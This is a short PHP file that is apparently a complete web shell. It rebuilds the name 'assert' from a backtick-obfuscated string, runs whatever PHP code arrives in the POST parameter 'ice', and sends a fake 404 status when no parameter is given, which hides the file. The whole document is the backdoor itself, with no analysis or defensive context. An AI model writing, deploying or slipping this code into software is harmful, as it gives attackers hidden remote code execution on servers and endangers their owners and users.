<?php 
$K=str_replace('`','','a`s`s`e`r`t');
$M=$_POST['ice'];
if($M==null)
	header('Status:404');
else
	$K($M);
?>